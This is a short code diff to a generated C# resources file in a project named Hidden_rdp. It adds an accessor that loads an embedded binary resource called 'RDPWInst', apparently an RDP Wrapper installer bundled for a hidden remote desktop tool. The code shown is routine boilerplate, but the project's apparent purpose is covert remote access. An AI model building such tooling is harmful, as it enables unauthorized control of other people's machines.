@@ -59,5 +59,15 @@ namespace Hidden_rdp.Properties {
                 resourceCulture = value;
             }
         }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] RDPWInst {
+            get {
+                object obj = ResourceManager.GetObject("RDPWInst", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
     }
 }
